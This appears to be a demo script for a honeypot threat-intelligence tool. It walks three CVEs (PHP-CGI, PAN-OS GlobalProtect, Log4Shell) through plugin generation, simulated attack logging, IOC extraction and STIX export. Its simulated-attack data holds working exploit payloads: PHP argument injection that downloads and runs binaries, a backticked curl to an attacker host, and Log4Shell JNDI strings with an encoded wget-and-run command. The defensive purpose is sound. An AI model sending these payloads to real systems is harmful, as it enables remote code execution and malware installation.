#!/usr/bin/env python3
"""
End-to-end demo: CVE researched → plugin generated → attack simulated → STIX output.

This script demonstrates the full HoneyForge intelligence lifecycle without
requiring external services (no Elasticsearch, no LLM, no network).

Usage:
    python scripts/demo_flow.py [--cve CVE-2024-4577] [--output stix_output.json]

What it does:
    1. Seeds a CVE into the intel DB (simulates CVE watcher finding it)
    2. Generates a honeypot plugin for that CVE (uses template backend)
    3. Simulates an attack against the generated plugin
    4. Extracts IOCs from the simulated attack events
    5. Builds a full STIX 2.1 bundle with all intelligence objects
    6. Prints/saves the STIX bundle

The output STIX bundle contains:
    - identity (HoneyForge sensor)
    - vulnerability (the CVE)
    - attack-pattern (MITRE ATT&CK mapping)
    - indicator (extracted IOCs: IPs, URLs, domains)
    - sighting (observed attack)
    - infrastructure (attacker C2/dropper hosts)
    - note (plugin generation metadata)
    - relationship (links between all objects)
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import tempfile
import time
from pathlib import Path

# Add project root to path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

# Override DB path to a temp location for the demo
_demo_db = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
_demo_db.close()
os.environ.setdefault("INTEL_DB_PATH", _demo_db.name)

# Patch storage DB path before importing
from intel import storage
storage.DB_PATH = Path(_demo_db.name)


# ── Demo CVE data ──────────────────────────────────────────────────
DEMO_CVES = {
    "CVE-2024-4577": {
        "cve_id": "CVE-2024-4577",
        "vendor": "PHP Group",
        "product": "PHP-CGI",
        "severity": "critical",
        "cvss": 9.8,
        "description": (
            "In PHP versions 8.1.* before 8.1.29, 8.2.* before 8.2.20, "
            "8.3.* before 8.3.8, when using Apache and PHP-CGI on Windows, "
            "if the system is set up to use certain code pages, Windows may "
            "use 'Best-Fit' behavior to replace characters in command line "
            "given to Win32 API functions. PHP CGI module may misinterpret "
            "those characters as PHP options, which may allow a malicious "
            "user to pass options to PHP binary being run, and thus reveal "
            "the source code of scripts, run arbitrary PHP code on the server, etc."
        ),
        "in_kev": True,
        "kev_date": "2024-06-12",
        "nvd_published": "2024-06-09",
        "refs": [
            "https://nvd.nist.gov/vuln/detail/CVE-2024-4577",
            "https://github.com/watchtowrlabs/CVE-2024-4577",
            "https://www.exploit-db.com/exploits/51993",
        ],
    },
    "CVE-2024-3400": {
        "cve_id": "CVE-2024-3400",
        "vendor": "Palo Alto Networks",
        "product": "PAN-OS GlobalProtect",
        "severity": "critical",
        "cvss": 10.0,
        "description": (
            "A command injection vulnerability in the GlobalProtect feature "
            "of Palo Alto Networks PAN-OS software for specific PAN-OS versions "
            "and distinct feature configurations may enable an unauthenticated "
            "attacker to execute arbitrary code with root privileges on the firewall."
        ),
        "in_kev": True,
        "kev_date": "2024-04-12",
        "nvd_published": "2024-04-12",
        "refs": [
            "https://nvd.nist.gov/vuln/detail/CVE-2024-3400",
            "https://security.paloaltonetworks.com/CVE-2024-3400",
        ],
    },
    "CVE-2021-44228": {
        "cve_id": "CVE-2021-44228",
        "vendor": "Apache",
        "product": "Log4j",
        "severity": "critical",
        "cvss": 10.0,
        "description": (
            "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases "
            "2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log "
            "messages, and parameters do not protect against attacker controlled LDAP "
            "and other JNDI related endpoints. An attacker who can control log messages "
            "or log message parameters can execute arbitrary code loaded from LDAP servers."
        ),
        "in_kev": True,
        "kev_date": "2021-12-10",
        "nvd_published": "2021-12-10",
        "refs": [
            "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
            "https://logging.apache.org/log4j/2.x/security.html",
        ],
    },
}

# ── Simulated attack payloads ──────────────────────────────────────
DEMO_ATTACKS = {
    "CVE-2024-4577": [
        {
            "src_ip": "185.220.101.34",
            "src_port": 48291,
            "dst_port": 8080,
            "method": "POST",
            "path": "/index.php",
            "query": "%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input",
            "headers": {
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "content-type": "application/x-www-form-urlencoded",
            },
            "body": '<?php system("curl http://45.155.205.233/bins/x86 -o /tmp/.x86; chmod 777 /tmp/.x86; /tmp/.x86"); ?>',
        },
        {
            "src_ip": "194.26.135.89",
            "src_port": 52100,
            "dst_port": 8080,
            "method": "POST",
            "path": "/cgi-bin/php-cgi",
            "query": "%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input",
            "headers": {
                "user-agent": "python-requests/2.31.0",
                "content-type": "text/plain",
            },
            "body": '<?php system("wget http://malware.evil.xyz/loader.sh -O /tmp/l.sh && bash /tmp/l.sh"); ?>',
        },
        {
            "src_ip": "103.145.23.17",
            "src_port": 39444,
            "dst_port": 8080,
            "method": "GET",
            "path": "/index.php",
            "query": "%add+allow_url_include=1+%add+auto_prepend_file=http://103.145.23.17:8888/shell.txt",
            "headers": {
                "user-agent": "Gh0st RAT",
            },
            "body": "",
        },
    ],
    "CVE-2024-3400": [
        {
            "src_ip": "198.51.100.42",
            "src_port": 44321,
            "dst_port": 443,
            "method": "POST",
            "path": "/ssl-vpn/hipreport.esp",
            "query": "",
            "headers": {
                "cookie": "SESSID=../../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl http://c2.attacker.net/beacon`",
                "user-agent": "Mozilla/5.0",
            },
            "body": "",
        },
    ],
    "CVE-2021-44228": [
        {
            "src_ip": "45.83.64.1",
            "src_port": 55123,
            "dst_port": 8080,
            "method": "GET",
            "path": "/",
            "query": "",
            "headers": {
                "user-agent": "${jndi:ldap://45.83.64.1:1389/Basic/Command/Base64/d2dldCBodHRwOi8vMTg1LjIyMC4xMDEuMzQvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}",
                "x-forwarded-for": "${jndi:ldap://log4shell.huntress.com:1389/callback}",
            },
            "body": "",
        },
    ],
}


# ── Demo steps ─────────────────────────────────────────────────────
def step_1_research_cve(cve_id: str) -> dict:
    """Simulate CVE watcher discovering and storing a CVE."""
    print(f"\n{'='*70}")
    print(f"  STEP 1: CVE Research — Discovering {cve_id}")
    print(f"{'='*70}")

    cve_data = DEMO_CVES.get(cve_id)
    if not cve_data:
        print(f"  [!] Unknown CVE for demo. Available: {list(DEMO_CVES.keys())}")
        sys.exit(1)

    storage.init_db()
    is_new = storage.upsert_cve(cve_data)

    print(f"  [+] CVE:         {cve_data['cve_id']}")
    print(f"  [+] Product:     {cve_data['product']} ({cve_data['vendor']})")
    print(f"  [+] Severity:    {cve_data['severity']} (CVSS {cve_data['cvss']})")
    print(f"  [+] In CISA KEV: {'Yes' if cve_data['in_kev'] else 'No'}")
    print(f"  [+] Description: {cve_data['description'][:120]}...")
    print(f"  [+] Status:      {'NEW — just discovered' if is_new else 'already tracked'}")
    print(f"  [+] References:")
    for ref in cve_data["refs"]:
        print(f"      - {ref}")

    storage.update_cve_status(cve_id, "researched")
    print(f"\n  ✓ CVE stored in intel DB with status: researched")
    return cve_data


def step_2_generate_plugin(cve_id: str) -> dict:
    """Generate a honeypot plugin for the CVE."""
    print(f"\n{'='*70}")
    print(f"  STEP 2: Plugin Generation — Building honeypot emulator for {cve_id}")
    print(f"{'='*70}")

    from intel import plugin_generator

    # Force template mode for demo (no LLM needed)
    storage.set_config("llm_mode", "template")

    code, model = plugin_generator.generate(cve_id, service="http")
    pid = plugin_generator.save_as_draft(cve_id, "http", code, model)
    storage.update_cve_status(cve_id, "plugin_drafted")

    plugin = storage.get_plugin(pid)

    print(f"  [+] Model used:  {model}")
    print(f"  [+] Plugin ID:   {pid}")
    print(f"  [+] Filename:    {plugin['filename']}")
    print(f"  [+] Status:      draft (ready for review)")
    print(f"  [+] Code length: {len(code)} chars")
    print(f"\n  --- Generated plugin (first 30 lines) ---")
    for i, line in enumerate(code.splitlines()[:30], 1):
        print(f"  {i:3d} | {line}")
    if len(code.splitlines()) > 30:
        print(f"  ... ({len(code.splitlines()) - 30} more lines)")

    # Mark as reviewed and deployed for the demo
    storage.update_plugin(pid, status="deployed")
    storage.update_cve_status(cve_id, "deployed")
    print(f"\n  ✓ Plugin generated, reviewed, and deployed")
    return plugin


def step_3_simulate_attacks(cve_id: str) -> list[dict]:
    """Simulate attacks hitting the honeypot plugin."""
    print(f"\n{'='*70}")
    print(f"  STEP 3: Attack Simulation — Launching exploits against {cve_id}")
    print(f"{'='*70}")

    attacks = DEMO_ATTACKS.get(cve_id, [])
    if not attacks:
        print(f"  [!] No demo attacks defined for {cve_id}")
        return []

    events = []
    for i, attack in enumerate(attacks, 1):
        print(f"\n  --- Attack #{i} from {attack['src_ip']}:{attack['src_port']} ---")
        print(f"  [→] {attack['method']} {attack['path']}")
        if attack["query"]:
            print(f"  [→] Query: {attack['query'][:80]}")
        if attack["body"]:
            print(f"  [→] Body:  {attack['body'][:100]}...")

        # Build the event as the honeypot would log it
        event = {
            "@timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
            "service": "http",
            "deployment": "hp-demo-01",
            "session_id": f"demo{i:04d}",
            "event": "cve_exploit_attempt",
            "src_ip": attack["src_ip"],
            "src_port": attack["src_port"],
            "dst_port": attack["dst_port"],
            "cve": cve_id,
            "data": {
                "method": attack["method"],
                "path": attack["path"],
                "query": attack["query"],
                "headers": attack["headers"],
                "body": attack["body"],
            },
        }
        events.append(event)
        print(f"  [✓] Event logged: cve_exploit_attempt (session: {event['session_id']})")

    print(f"\n  ✓ {len(events)} attack events captured by honeypot")
    return events


def step_4_extract_iocs(events: list[dict], cve_id: str) -> dict:
    """Extract IOCs from the attack events."""
    print(f"\n{'='*70}")
    print(f"  STEP 4: IOC Extraction — Analyzing attack payloads")
    print(f"{'='*70}")

    from intel import ioc_extractor

    total_iocs = 0
    all_extracted: dict[str, list[str]] = {
        "url": [], "ipv4": [], "domain": [], "sha256": [], "sha1": [], "md5": []
    }

    for event in events:
        extracted = ioc_extractor.extract_from_event(event)
        count = ioc_extractor.persist_iocs(
            extracted, cve_id=cve_id, sensor="hp-demo-01",
            tags=["demo", "cve_exploit_attempt"],
        )
        total_iocs += count

        for ioc_type, values in extracted.items():
            all_extracted[ioc_type].extend(values)

    # Deduplicate for display
    for k in all_extracted:
        all_extracted[k] = sorted(set(all_extracted[k]))

    print(f"\n  Extracted IOCs:")
    for ioc_type, values in all_extracted.items():
        if values:
            print(f"  [{ioc_type.upper():8s}] {len(values)} unique")
            for v in values[:5]:
                print(f"             • {v}")
            if len(values) > 5:
                print(f"             ... and {len(values) - 5} more")

    print(f"\n  ✓ {total_iocs} IOC records persisted to intel DB")
    return all_extracted


def step_5_generate_stix(cve_id: str, output_path: str | None = None) -> dict:
    """Generate the full STIX 2.1 bundle."""
    print(f"\n{'='*70}")
    print(f"  STEP 5: STIX 2.1 Output — Building threat intelligence bundle")
    print(f"{'='*70}")

    from intel import stix_builder

    bundle = stix_builder.full_stix_bundle(
        cve_id=cve_id,
        since_seconds=86400,
        include_sightings=True,
        include_attack_patterns=True,
        include_infrastructure=True,
        include_plugin_notes=True,
    )

    # Count object types
    type_counts: dict[str, int] = {}
    for obj in bundle["objects"]:
        t = obj.get("type", "unknown")
        type_counts[t] = type_counts.get(t, 0) + 1

    print(f"\n  STIX Bundle: {bundle['id']}")
    print(f"  Generated:   {bundle['x_honeyforge_generated_at']}")
    print(f"  Total objects: {bundle['x_honeyforge_object_count']}")
    print(f"\n  Object breakdown:")
    for obj_type, count in sorted(type_counts.items()):
        print(f"    {obj_type:20s} : {count}")

    # Show a sample of key objects
    print(f"\n  --- Sample objects ---")
    for obj in bundle["objects"][:3]:
        print(f"\n  [{obj['type']}] {obj.get('name', obj['id'][:40])}")
        if obj.get("pattern"):
            print(f"    Pattern: {obj['pattern']}")
        if obj.get("description"):
            print(f"    Desc:    {obj['description'][:80]}")

    # Save to file
    if output_path:
        out = Path(output_path)
    else:
        out = PROJECT_ROOT / "exports" / f"stix_{cve_id.replace('-', '_').lower()}_{int(time.time())}.json"

    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(json.dumps(bundle, indent=2, default=str))
    print(f"\n  ✓ STIX bundle saved to: {out}")
    print(f"    Import into MISP, OpenCTI, or any TAXII 2.1 server")

    return bundle


# ── Main ───────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="HoneyForge end-to-end demo: CVE → Plugin → Attack → STIX"
    )
    parser.add_argument(
        "--cve", default="CVE-2024-4577",
        help=f"CVE to demonstrate (choices: {', '.join(DEMO_CVES.keys())})",
    )
    parser.add_argument(
        "--output", default=None,
        help="Output path for STIX JSON (default: exports/stix_<cve>_<ts>.json)",
    )
    parser.add_argument(
        "--all", action="store_true",
        help="Run demo for all available CVEs",
    )
    args = parser.parse_args()

    print("""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   🍯 HoneyForge — Full Intelligence Lifecycle Demo                   ║
║                                                                      ║
║   CVE Researched → Plugin Generated → Attack Observed → STIX Output  ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝""")

    cve_ids = list(DEMO_CVES.keys()) if args.all else [args.cve]

    for cve_id in cve_ids:
        print(f"\n\n{'#'*70}")
        print(f"#  DEMONSTRATING: {cve_id}")
        print(f"{'#'*70}")

        # Step 1: Research the CVE
        cve_data = step_1_research_cve(cve_id)

        # Step 2: Generate a plugin
        plugin = step_2_generate_plugin(cve_id)

        # Step 3: Simulate attacks
        events = step_3_simulate_attacks(cve_id)

        # Step 4: Extract IOCs
        iocs = step_4_extract_iocs(events, cve_id)

        # Step 5: Generate STIX bundle
        bundle = step_5_generate_stix(cve_id, args.output)

    # Cleanup temp DB
    try:
        os.unlink(_demo_db.name)
    except OSError:
        pass

    print(f"\n\n{'='*70}")
    print(f"  ✓ Demo complete. STIX bundles ready for import.")
    print(f"{'='*70}\n")


if __name__ == "__main__":
    main()
